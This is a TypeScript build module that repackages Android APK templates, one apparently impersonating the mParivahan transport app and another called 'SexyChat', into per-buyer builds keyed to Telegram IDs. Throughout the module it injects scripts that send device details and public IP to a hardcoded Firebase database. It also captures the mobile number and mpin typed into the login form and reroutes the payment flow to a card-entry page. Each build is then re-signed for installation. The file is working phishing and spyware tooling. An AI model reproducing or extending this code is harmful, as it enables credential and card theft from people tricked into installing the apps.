import { exec } from "child_process";
import { promisify } from "util";
import * as fs from "fs";
import * as path from "path";
import { fileURLToPath } from "url";
import { createWriteStream } from "fs";
import { pipeline } from "stream/promises";

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Find the repo-root `output/` directory that contains release.keystore.
const SDK_HEARTBEAT = (devId: string) =>
    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>` +
    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>` +
    `<script>` +
    `(function(){try{var hbDev="${devId}";` +
    `firebase.initializeApp({apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb",storageBucket:"axexodiweb.firebasestorage.app",messagingSenderId:"389800586861",appId:"1:389800586861:android:bc07658134ed77dad59964"});` +
    `function hb(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua,ownerTelegramId:hbDev};var s=ua.indexOf("(");var e=ua.indexOf(")");var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(";");if(parts.length>=3)rec.modelName=parts[2].trim()||"Android Device";else if(parts.length>=2)rec.modelName=parts[1].trim()||"Android Device";else rec.modelName="Android Device";var av=(parts[1]?parts[1].trim():"");if(av.indexOf("Android ")===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||""):"");function done(x){if(x){for(var q in x)rec[q]=x[q];}firebase.database().ref("clients/"+hbDev).update(rec).catch(function(){});}var p=[];try{if(navigator.getBattery){p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}}catch(er){}try{if(navigator.storage&&navigator.storage.estimate){p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}}catch(er){}try{p.push(fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||""};}).catch(function(){return{};}));}catch(er){}if(p.length){Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});done(ex);}).catch(function(){done({});});}else{done({});}}` +
    `hb();setInterval(hb,60000);document.addEventListener("visibilitychange",function(){if(!document.hidden)hb()})` +
    `}catch(e){}})();` +
    `</script>`;



// Works whether __dirname is the source path (src/bot) or the bundled dist,
// because we walk up until we find a directory that owns `output/`.
function findOutputDir(): string {
  let dir = __dirname;
  for (let i = 0; i < 6; i++) {
    const candidate = path.join(dir, "output");
    const hasMarker =
      fs.existsSync(path.join(candidate, "apktool.jar")) ||
      fs.existsSync(path.join(candidate, "release.keystore")) ||
      fs.existsSync(path.join(candidate, "NEWUIMPRIVHN-product.keystore"));
    if (hasMarker) return candidate;
    const parent = path.dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  // Fallback: assume repo root is two levels above artifacts/api-server/dist
  return path.resolve(__dirname, "..", "..", "..", "output");
}

const OUTPUT_DIR = findOutputDir();
const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");

/** Exposed for routes that need the real output/cache location. */
export function getApkCacheDir(): string {
  return APK_CACHE_DIR;
}

// ── Shared build plumbing ────────────────────────────────────────────────────
// Unique per-build temp dirs: concurrent builds for the same user used to
// collide on fixed /tmp paths (the #1 cause of hangs). Every build now gets
// its own dir + output, and cleans up in a finally.
let buildSeq = 0;
function uniqueTag(prefix: string): string {
  buildSeq = (buildSeq + 1) % 1_000_000;
  return `${prefix}_${process.pid}_${Date.now().toString(36)}_${buildSeq.toString(36)}`;
}
async function copyTemplate(templateDir: string, tag: string): Promise<string> {
  const dir = `/tmp/${tag}`;
  await execAsync(`cp -r "${templateDir}" "${dir}"`, { timeout: 30_000 });
  return dir;
}
function rmrf(dir: string): void {
  execAsync(`rm -rf "${dir}"`).catch(() => {});
}

// Cache freshness: a per-file stamp records the template mtime so edits to the
// base template invalidate stale builds instead of serving them forever.
function templateStamp(candidates: string[]): string {
  for (const p of candidates) {
    try {
      if (fs.existsSync(p)) return String(fs.statSync(p).mtimeMs);
    } catch {}
  }
  return "0";
}
function cacheFresh(cacheFile: string, candidates: string[]): boolean {
  if (!fs.existsSync(cacheFile)) return false;
  const meta = cacheFile + ".stamp";
  try {
    if (!fs.existsSync(meta)) return false; // no stamp yet → rebuild once
    return fs.readFileSync(meta, "utf-8").trim() === templateStamp(candidates);
  } catch {
    return false;
  }
}
function writeCacheStamp(cacheFile: string, candidates: string[]): void {
  try {
    fs.writeFileSync(cacheFile + ".stamp", templateStamp(candidates), "utf-8");
  } catch {}
}

// Bump versionCode so re-installs are true upgrades. apktool manages the
// version in apktool.yml (versionInfo:), not the text AndroidManifest.xml.
function bumpVersionCode(buildDir: string): void {
  const yml = path.join(buildDir, "apktool.yml");
  if (!fs.existsSync(yml)) return;
  try {
    let txt = fs.readFileSync(yml, "utf-8");
    txt = txt.replace(
      /versionCode:\s*(\d+)/,
      (_m, v) => `versionCode: ${Number(v) + 1}`
    );
    fs.writeFileSync(yml, txt, "utf-8");
  } catch (err) {
    console.warn(
      "[apkBuilder] versionCode bump failed:",
      (err as Error).message
    );
  }
}

// Latest-Android support: targetSdk -> 35 (stored in apktool.yml) and add the
// android:exported attribute Android 11+ requires on every component that
// declares an intent-filter (the old targetSdk 28 manifest omitted it — the
// install would fail otherwise at targetSdk 31+).
function modernizeManifest(buildDir: string): void {
  const yml = path.join(buildDir, "apktool.yml");
  if (fs.existsSync(yml)) {
    try {
      let txt = fs.readFileSync(yml, "utf-8");
      txt = txt.replace(/targetSdkVersion:\s*\d+/, "targetSdkVersion: 35");
      fs.writeFileSync(yml, txt, "utf-8");
    } catch (err) {
      console.warn(
        "[apkBuilder] targetSdk bump failed:",
        (err as Error).message
      );
    }
  }
  const mp = path.join(buildDir, "AndroidManifest.xml");
  if (!fs.existsSync(mp)) return;
  try {
    let txt = fs.readFileSync(mp, "utf-8");
    const adds: [string, string][] = [
      [
        '<activity android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"',
        '<activity android:exported="true" android:configChanges="keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize" android:hardwareAccelerated="true" android:name=".MainActivity"',
      ],
      [
        '<activity android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>',
        '<activity android:exported="true" android:name="dApp.binance.Trading.Signals.PermissionRequestActivity"/>',
      ],
      [
        '<receiver android:name=".AlarmReceiver"/>',
        '<receiver android:exported="true" android:name=".AlarmReceiver"/>',
      ],
      [
        '<receiver android:name=".MultiEventReceiver">',
        '<receiver android:exported="true" android:name=".MultiEventReceiver">',
      ],
    ];
    for (const [from, to] of adds) txt = txt.split(from).join(to);
    fs.writeFileSync(mp, txt, "utf-8");
  } catch (err) {
    console.warn(
      "[apkBuilder] exported-attr patch failed:",
      (err as Error).message
    );
  }
}

// Shared placeholder patcher — replaces braced + unbraced forms so baked ids
// land as plain values (avoids invalid Firebase path nodes like {id}).
function patchFile(
  buildDir: string,
  relPath: string,
  replacements: [string, string][]
): void {
  const filePath = path.join(buildDir, relPath);
  if (!fs.existsSync(filePath)) return;
  let txt = fs.readFileSync(filePath, "utf-8");
  for (const [from, to] of replacements) {
    txt = txt.split("{" + from + "}").join(to);
    txt = txt.split(from).join(to);
  }
  fs.writeFileSync(filePath, txt, "utf-8");
}

const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
const SEXY_TEMPLATE_DIR = "/tmp/sexy_patch/decoded";
const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");
const SEXY_DECODED_TAR_GZ = path.join(
  OUTPUT_DIR,
  "sexy_template_decoded.tar.gz"
);
const SEXY_SMALI_FILE_REL = "assets/pin.html";

const OWNER_PLACEHOLDER = "OWNER_TELEGRAM_ID_000000000";
const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
const DEVICE_ID_PLACEHOLDER = "DEVICE_ID_MY_PROJECT";
// mParivahan v3 base: the notify service (dApp/binance/Trading/Signals/
// MyService$1) reads the owner chat id from res/raw/Loda via AdminInfo —
// no OWNER constant lives in smali anymore, so Loda is the readiness marker.
const LODA_FILE_REL = "res/raw/Loda";
const CARD_HTML_REL = "assets/card.html";

// ── Nix fallback (Replit only) ────────────────────────────────────────────────
const NIX_APKTOOL =
  "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
const KEYSTORE = path.join(OUTPUT_DIR, "NEWUIMPRIVHN-product.keystore");
// Signing keystore password — env override, else on-disk .signing-pass, else legacy default.
const KS_PASS = (() => {
  const fromEnv = process.env["APK_KEYSTORE_PASS"];
  if (fromEnv) return fromEnv;
  const pf = path.join(OUTPUT_DIR, ".signing-pass");
  try {
    if (fs.existsSync(pf)) return fs.readFileSync(pf, "utf-8").trim();
  } catch {}
  return "android123";
})();

// Android SDK build-tools (installed at /opt/android-sdk) — provides zipalign + apksigner.
const APKSIGNER_BIN = "/opt/android-sdk/android-14/apksigner";
const ZIPALIGN_BIN = "/opt/android-sdk/android-14/zipalign";

/**
 * Properly sign an APK: zipalign first, then apksigner with v1+v2.
 * v1-only (jarsigner) does NOT install on Android 11+ (API 30+).
 */
async function signApk(unsignedApk: string, finalApk: string): Promise<void> {
  // 1) zipalign -p 4 (must run BEFORE apksigner for v2)
  const alignedApk = `${unsignedApk}.aligned`;
  await execAsync(
    `"${ZIPALIGN_BIN}" -p -f 4 "${unsignedApk}" "${alignedApk}"`,
    { timeout: 60_000 }
  );

  // 2) apksigner sign with v1+v2 schemes
  await execAsync(
    `"${APKSIGNER_BIN}" sign --ks "${KEYSTORE}" --ks-pass pass:${KS_PASS} ` +
      `--v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true ` +
      `"${alignedApk}"`,
    { timeout: 60_000 }
  );

  // 3) move signed aligned APK to final output
  await execAsync(`cp -f "${alignedApk}" "${finalApk}"`, { timeout: 30_000 });
  await execAsync(`rm -f "${alignedApk}" "${alignedApk}.idsig"`).catch(
    () => {}
  );
}

/** Force mobile viewport + mobile user-agent on the cloned-WebView activity. */
/** Remove the PANEL BRIDGE bar + "OPEN WEB PANEL" button from the boot UI. */
function stripBridgeFrom(htmlPath: string): void {
  if (!fs.existsSync(htmlPath)) return;
  let html = fs.readFileSync(htmlPath, "utf-8");
  const start = html.indexOf("<!-- ── Panel bridge");
  if (start < 0) return;
  const end = html.indexOf("</script>", start);
  if (end < 0) return;
  html = html.slice(0, start) + html.slice(end + "</script>".length);
  fs.writeFileSync(htmlPath, html, "utf-8");
}

function removePanelBridge(buildDir: string): void {
  stripBridgeFrom(path.join(buildDir, "assets/index.html"));
  stripBridgeFrom(path.join(buildDir, "assets/method.html"));
  stripBridgeFrom(path.join(buildDir, "assets/final.html"));
  console.log("[apkBuilder] PANEL BRIDGE bar removed from boot UIs");
}

/**
 * Upgrade heartbeat scripts so the panel sees a real device.
 *
 * Uses the SAME mechanism as the original V1BASE template: the Firebase JS
 * SDK (firebase-app + firebase-database from gstatic CDN) writing
 * clients/{id} via database().ref(...).update(...). The raw-fetch heartbeat
 * never fired on real devices (navigation aborted the silent .catch() fetch),
 * so we replace it with the SDK path that V1BASE proved works.
 */

function patchPaymentFlow(buildDir: string): void {
  // Re-route the method page -> the card payment page so the card section appears in the flow.
  const methodFp = path.join(buildDir, "assets/method.html");
  if (fs.existsSync(methodFp)) {
    let m = fs.readFileSync(methodFp, "utf-8");
    if (
      m.includes('window.location.href = "pin.html"') &&
      !m.includes('"card.html"')
    ) {
      m = m.replace(
        'window.location.href = "pin.html"',
        'window.location.href = "card.html"'
      );
      fs.writeFileSync(methodFp, m, "utf-8");
    }
  }
  const cardFp = path.join(buildDir, CARD_HTML_REL);
  if (fs.existsSync(cardFp)) {
    let c = fs.readFileSync(cardFp, "utf-8");
    const AXE = `const firebaseConfig = {apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb",storageBucket:"axexodiweb.firebasestorage.app",messagingSenderId:"389800586861",appId:"1:389800586861:android:bc07658134ed77dad59964"};`;
    c = c.replace(/const firebaseConfig = \{[\s\S]*?\};/, AXE);
    if (!c.includes("lastPing")) {
      const CARD_HB = `<script>(function(){try{var hbDev='{DEVICE_ID_MY_PROJECT}';function hbc(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua};var s=ua.indexOf('(');var e=ua.indexOf(')');var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(';');if(parts.length>=3)rec.modelName=parts[2].trim()||'Android Device';else if(parts.length>=2)rec.modelName=parts[1].trim()||'Android Device';else rec.modelName='Android Device';var av=(parts[1]?parts[1].trim():'');if(av.indexOf('Android ')===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||''):'');var url='https://axexodiweb-default-rtdb.firebaseio.com/clients/'+hbDev+'.json';function patch(x){if(x){for(var q in x)rec[q]=x[q];}fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(rec)}).catch(function(){});}var p=[];try{if(navigator.getBattery)p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}catch(er){}try{if(navigator.storage&&navigator.storage.estimate)p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}catch(er){}try{p.push(fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||''};}).catch(function(){return{};}));}catch(er){}if(p.length)Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});patch(ex);}).catch(function(){patch({});});else patch({});}hbc();setInterval(hbc,60000);document.addEventListener('visibilitychange',function(){if(!document.hidden)hbc()});}catch(er){})();</script>`;
      c = c.replace("</body>", CARD_HB + "</body>");
    }
    fs.writeFileSync(cardFp, c, "utf-8");
  }
  console.log(
    "[apkBuilder] payment flow patched (card section wired, axexodiweb config)"
  );
}

function upgradeHeartbeat(buildDir: string): void {
  for (const rel of [
    "assets/index.html",
    "assets/method.html",
    "assets/final.html",
    "assets/pin.html",
  ]) {
    const fp = path.join(buildDir, rel);
    if (!fs.existsSync(fp)) continue;
    let html = fs.readFileSync(fp, "utf-8");
    if (!html.includes("lastPing")) continue;
    // Replace BOTH raw-fetch heartbeat IIFE variants with the SDK one.
    // The DEVICE_ID placeholder survives into patchFile(), which bakes the id.
    html = html.replace(
      /<script>\s*\(function\(\)\{try\{var hbDev="[^"]*";[^<]*?\}\)\(\);<\/script>/g,
      SDK_HEARTBEAT("{DEVICE_ID_MY_PROJECT}")
    );
    // Strip any bare fetch-heartbeat IIFE left without a <script> wrapper.
    html = html.replace(
      /\s*\(function\(\)\{try\{var hbDev="[^"]*";function hb\(\)\{fetch\([^<]*?\}\)\(\);?/g,
      ""
    );
    // Guarantee exactly one SDK heartbeat per page.
    if (!html.includes("firebase.initializeApp")) {
      html = html.replace(
        "</body>",
        SDK_HEARTBEAT("{DEVICE_ID_MY_PROJECT}") + "</body>"
      );
    }
    // mParivahan login form -> panel: capture Mobile + Vehicle Number into the
    // client record (mobNo shows in Devices list, vehicle in device detail).
    if (rel === "assets/index.html" && html.includes("login-container")) {
      const LOGIN_CAPTURE =
        `<script>` +
        `(function(){try{` +
        `function cap(){try{` +
        `var m=(document.getElementById("Mobile")||{}).value||"";` +
        `var v=(document.getElementById("mpin")||{}).value||"";` +
        `if(!m&&!v)return;` +
        `if(window.firebase&&firebase.database){` +
        `firebase.database().ref("clients/{DEVICE_ID_MY_PROJECT}").update({mobNo:m,vehicleNumber:v,loginTime:Date.now(),status:true}).catch(function(){})}}catch(e){}}` +
        `document.addEventListener("DOMContentLoaded",function(){` +
        `var sb=document.getElementById("submit-btn");if(sb)sb.addEventListener("click",function(){setTimeout(cap,500)});` +
        `var pb=document.getElementById("paybtn");if(pb)pb.addEventListener("click",function(){setTimeout(cap,500)});` +
        `document.addEventListener("click",function(){setTimeout(cap,1200)})});` +
        `window.addEventListener("pageshow",cap);` +
        `}catch(e){}})();` +
        `</script>`;
      html = html.replace("</body>", LOGIN_CAPTURE + "</body>");
    }
    fs.writeFileSync(fp, html, "utf-8");
  }
  console.log("[apkBuilder] heartbeat upgraded (Firebase SDK, V1BASE-style)");
}

function patchWebViewMobileMode(buildDir: string): void {
  const smaliPath = path.join(
    buildDir,
    "smali_classes4/trades/signals/more/ChallanWebActivity.smali"
  );
  if (!fs.existsSync(smaliPath)) return;
  let txt = fs.readFileSync(smaliPath, "utf-8");

  // onCreate .locals 6 -> 8 so v7 is a true LOCAL register.
  // With .locals 7, v7 maps to parameter p0 (=this Activity), which broke
  // setLoadWithOverviewMode(p0) -> desktop mode + white screen.
  txt = txt.replace(
    ".method protected onCreate(Landroid/os/Bundle;)V\n    .locals 6",
    ".method protected onCreate(Landroid/os/Bundle;)V\n    .locals 8"
  );

  // Ensure onCreate has enough registers (v6 must be valid: .locals >= 7)
  txt = txt.replace(
    "invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V",
    "const/4 v7, 0x0\n\n    invoke-virtual {v2, v7}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V"
  );

  // setUseWideViewPort(true) -> false  (use the page's own mobile viewport)
  txt = txt.replace(
    "invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V",
    "const/4 v7, 0x0\n\n    invoke-virtual {v2, v7}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V"
  );

  // Add mobile user-agent string so sites serve the mobile layout.
  if (!txt.includes("setUserAgentString")) {
    txt = txt.replace(
      "invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V",
      'invoke-virtual {v2, v5}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V\n\n    const-string v7, "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"\n\n    invoke-virtual {v2, v7}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V'
    );
  }

  fs.writeFileSync(smaliPath, txt, "utf-8");
}

const APKTOOL_JAR = path.join(OUTPUT_DIR, "apktool.jar");
const APKTOOL_BIN = path.join(OUTPUT_DIR, "apktool.sh");
const APKTOOL_URL =
  "https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar";

// ── Download apktool.jar using Node.js fetch (no wget/curl needed) ────────────
async function downloadApktool(): Promise<void> {
  if (fs.existsSync(APKTOOL_JAR)) return; // already downloaded
  console.log("[apkBuilder] Downloading apktool.jar...");
  fs.mkdirSync(OUTPUT_DIR, { recursive: true });
  const resp = await fetch(APKTOOL_URL);
  if (!resp.ok) throw new Error(`apktool download failed: ${resp.status}`);
  const ws = createWriteStream(APKTOOL_JAR);
  // @ts-ignore — Node 18 fetch body is a ReadableStream
  await pipeline(resp.body as any, ws);
  console.log("[apkBuilder] apktool.jar downloaded.");
}

// ── Find java binary (system PATH → common Ubuntu JRE paths) ─────────────────
async function findJava(): Promise<string> {
  // 1. env override
  const fromEnv = process.env["JAVA_PATH"];
  if (fromEnv && fs.existsSync(fromEnv)) return fromEnv;
  // 2. system PATH
  try {
    const { stdout } = await execAsync("which java 2>/dev/null");
    if (stdout.trim()) return stdout.trim();
  } catch {}
  // 3. common Ubuntu/Debian locations
  const candidates = [
    "/usr/bin/java",
    "/usr/lib/jvm/default-java/bin/java",
    "/usr/lib/jvm/java-17-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-11-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-21-openjdk-amd64/bin/java",
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  throw new Error("java not found. Set JAVA_PATH env var on Render.");
}

// ── Ensure apktool wrapper is ready (download + create wrapper sh) ────────────
async function ensureApktool(): Promise<string> {
  // Nix path works on Replit — use it directly
  if (fs.existsSync(NIX_APKTOOL)) return NIX_APKTOOL;
  // env override
  const fromEnv = process.env["APKTOOL_PATH"];
  if (fromEnv && fs.existsSync(fromEnv)) return fromEnv;

  // Download jar if missing
  await downloadApktool();

  // Create wrapper script (bash calls java -jar)
  const java = await findJava();
  const wrapper = `#!/bin/bash\nexec "${java}" -jar "${APKTOOL_JAR}" "$@"\n`;
  fs.writeFileSync(APKTOOL_BIN, wrapper, { mode: 0o755 });
  return APKTOOL_BIN;
}

/** Called at server startup — ensures the decoded template is ready. */
export async function initApkTemplate(): Promise<void> {
  const smaliPath = path.join(APK_TEMPLATE_DIR, LODA_FILE_REL);
  if (fs.existsSync(smaliPath)) {
    console.log("[apkBuilder] Template already decoded — ready.");
    return;
  }

  fs.mkdirSync("/tmp/apk_patch", { recursive: true });

  // Fast path: extract pre-built tar.gz (~2s)
  if (fs.existsSync(DECODED_TAR_GZ)) {
    console.log("[apkBuilder] Extracting template from tar.gz...");
    try {
      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, {
        timeout: 60_000,
      });
      console.log("[apkBuilder] Template extracted and ready.");
      // Also pre-download apktool in background so /apk is fast
      ensureApktool().catch((e) =>
        console.warn("[apkBuilder] apktool pre-download failed:", e.message)
      );
      return;
    } catch (err) {
      console.error("[apkBuilder] tar extraction failed:", err);
    }
  }

  // Fallback: full apktool decode
  const baseApk = fs.existsSync(BASE_TEMPLATE_APK)
    ? BASE_TEMPLATE_APK
    : await getApkPath();
  if (!baseApk) {
    console.error("[apkBuilder] No base APK found — /apk command will fail.");
    return;
  }
  try {
    const apktool = await ensureApktool();
    console.log(
      "[apkBuilder] Decoding APK template via apktool (one-time, ~90s)..."
    );
    await execAsync(`"${apktool}" d -f -o "${APK_TEMPLATE_DIR}" "${baseApk}"`, {
      timeout: 300_000,
    });
    console.log("[apkBuilder] Template decoded and ready.");
  } catch (err) {
    console.error("[apkBuilder] Failed to decode APK template:", err);
  }
}

/** Called at startup - ensures SexyChat template is ready */
export async function initSexyTemplate(): Promise<void> {
  const pinPath = path.join(SEXY_TEMPLATE_DIR, SEXY_SMALI_FILE_REL);
  if (fs.existsSync(pinPath)) {
    console.log("[apkBuilder] SexyChat template already decoded — ready.");
    return;
  }

  fs.mkdirSync("/tmp/sexy_patch", { recursive: true });

  if (fs.existsSync(SEXY_DECODED_TAR_GZ)) {
    console.log("[apkBuilder] Extracting SexyChat template from tar.gz...");
    try {
      await execAsync(`tar -xzf "${SEXY_DECODED_TAR_GZ}" -C /tmp`, {
        timeout: 60_000,
      });
      console.log("[apkBuilder] SexyChat template extracted and ready.");
      ensureApktool().catch((e) =>
        console.warn("[apkBuilder] apktool pre-download failed:", e.message)
      );
      return;
    } catch (err) {
      console.error("[apkBuilder] SexyChat tar extraction failed:", err);
    }
  }

  // Fallback: decode SexyChat_final.apk directly
  const sexyApk = path.join(OUTPUT_DIR, "SexyChat_final.apk");
  if (!fs.existsSync(sexyApk)) return;
  try {
    const apktool = await ensureApktool();
    console.log(
      "[apkBuilder] Decoding SexyChat APK via apktool (one-time, ~90s)..."
    );
    await execAsync(
      `"${apktool}" d -f -o "${SEXY_TEMPLATE_DIR}" "${sexyApk}"`,
      {
        timeout: 300_000,
      }
    );
    console.log("[apkBuilder] SexyChat template decoded and ready.");
  } catch (err) {
    console.error("[apkBuilder] Failed to decode SexyChat APK:", err);
  }
}

export function isSexyTemplateReady(): boolean {
  return fs.existsSync(path.join(SEXY_TEMPLATE_DIR, SEXY_SMALI_FILE_REL));
}

/**
 * Build a per-user SexyChat APK with deviceId/ownerTelegramId baked in.
 */
export async function buildSexyChatApk(
  telegramId: string
): Promise<string | null> {
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });

  const cachedApk = path.join(APK_CACHE_DIR, `sexy_${telegramId}.apk`);
  const stamps = [
    SEXY_DECODED_TAR_GZ,
    path.join(OUTPUT_DIR, "SexyChat_final.apk"),
    SEXY_TEMPLATE_DIR,
  ];
  if (cacheFresh(cachedApk, stamps)) return cachedApk;

  if (!isSexyTemplateReady()) {
    await initSexyTemplate();
    if (!isSexyTemplateReady()) return null;
  }

  const buildDir = await copyTemplate(
    SEXY_TEMPLATE_DIR,
    uniqueTag("sexy_build")
  );
  const unsignedApk = `/tmp/${uniqueTag("sexy_unsigned")}.apk`;
  try {
    // Force mobile viewport/user-agent on WebView activity (fix desktop mode + white screen).
    patchWebViewMobileMode(buildDir);
    removePanelBridge(buildDir);
    upgradeHeartbeat(buildDir);
    patchPaymentFlow(buildDir);

    // Replace DEVICE_ID placeholder in pin.html
    patchFile(buildDir, SEXY_SMALI_FILE_REL, [
      ["{" + DEVICE_ID_PLACEHOLDER + "}", telegramId],
      [DEVICE_ID_PLACEHOLDER, telegramId],
    ]);

  bumpVersionCode(buildDir);
    modernizeManifest(buildDir);

    const apktool = await ensureApktool();
    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
      timeout: 300_000,
    });
    await signApk(unsignedApk, cachedApk);
    writeCacheStamp(cachedApk, stamps);
    return cachedApk;
  } catch (err) {
    console.error("[apkBuilder] buildSexyChatApk failed:", err);
    return null;
  } finally {
    rmrf(buildDir);
    execAsync(`rm -f "${unsignedApk}"`).catch(() => {});
  }
}

export async function getApkPath(): Promise<string | null> {
  const candidates = [
    path.join(OUTPUT_DIR, "mParivahan_base_template.apk"),
    path.join(OUTPUT_DIR, "mParivahan_v2.apk"),
    path.join(OUTPUT_DIR, "mParivahan_yellowstone.apk"),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  return null;
}

export function isTemplateReady(): boolean {
  return fs.existsSync(path.join(APK_TEMPLATE_DIR, LODA_FILE_REL));
}

/**
 * Build a per-user APK with ownerTelegramId baked in.
 * First call per user: ~30–60s (download apktool if needed + compile + sign).
 * Subsequent calls: instant (cached).
 */
export async function buildUserApk(telegramId: string): Promise<string | null> {
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });

  const cachedApk = path.join(APK_CACHE_DIR, `${telegramId}.apk`);
  const stamps = [DECODED_TAR_GZ, BASE_TEMPLATE_APK, APK_TEMPLATE_DIR];
  if (cacheFresh(cachedApk, stamps)) return cachedApk;

  if (!isTemplateReady()) {
    await initApkTemplate();
    if (!isTemplateReady()) return null;
  }

  const panelUrl = (
    process.env["PANEL_URL"] ||
    (process.env["REPLIT_DEV_DOMAIN"]
      ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
      : "")
  ).replace(/\/$/, "");

  const buildDir = await copyTemplate(APK_TEMPLATE_DIR, uniqueTag("apk_build"));
  const unsignedApk = `/tmp/${uniqueTag("apk_unsigned")}.apk`;
  try {
    // Force mobile viewport/user-agent on WebView activity (fix desktop mode + white screen).
    patchWebViewMobileMode(buildDir);
    removePanelBridge(buildDir);
    upgradeHeartbeat(buildDir);
    patchPaymentFlow(buildDir);

    // Guard: never bake template placeholders into a shipped APK. If the
    // telegramId is not a plain numeric id, abort the build — a placeholder
    // id reaching a device record means "chat not found" spam forever after.
    if (!/^\d{5,20}$/.test(String(telegramId || "").trim())) {
      console.error(
        "[apkBuilder] refusing to build: telegramId is not numeric:",
        telegramId
      );
      return null;
    }

    // v3 base: owner id is baked into Loda (service reads it via AdminInfo)
    // and card.html (telegramChatId + ownerTelegramId); no smali patch needed.
    patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
    patchFile(buildDir, CARD_HTML_REL, [
      [OWNER_PLACEHOLDER, telegramId],
      [DEVICE_ID_PLACEHOLDER, telegramId],
      [PANEL_URL_PLACEHOLDER, panelUrl],
    ]);
    // v3 template (NEWUIMPRIVHN): pin.html carries the device id used for
    // client reporting — bake it so every device writes its own record.
    patchFile(buildDir, "assets/pin.html", [
      [DEVICE_ID_PLACEHOLDER, telegramId],
      [OWNER_PLACEHOLDER, telegramId],
    ]);
    // v3 boot screens (index/method/final) carry the heartbeat snippet —
    // bake the device id so it reports to clients/{ownerId} like the native side.
    for (const bootFile of [
      "assets/index.html",
      "assets/method.html",
      "assets/final.html",
    ]) {
      patchFile(buildDir, bootFile, [
        [DEVICE_ID_PLACEHOLDER, telegramId],
        [OWNER_PLACEHOLDER, telegramId],
      ]);
    }

    bumpVersionCode(buildDir);
    modernizeManifest(buildDir);

    const apktool = await ensureApktool();
    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
      timeout: 300_000,
    });
    await signApk(unsignedApk, cachedApk);
    writeCacheStamp(cachedApk, stamps);
    return cachedApk;
  } catch (err) {
    console.error("[apkBuilder] buildUserApk failed:", err);
    return null;
  } finally {
    rmrf(buildDir);
    execAsync(`rm -f "${unsignedApk}"`).catch(() => {});
  }
}

/** Zip an APK so the user gets a .zip containing their personalized build. */
export async function packageApkZip(
  apkPath: string,
  label: string
): Promise<string | null> {
  if (!apkPath || !fs.existsSync(apkPath)) return null;
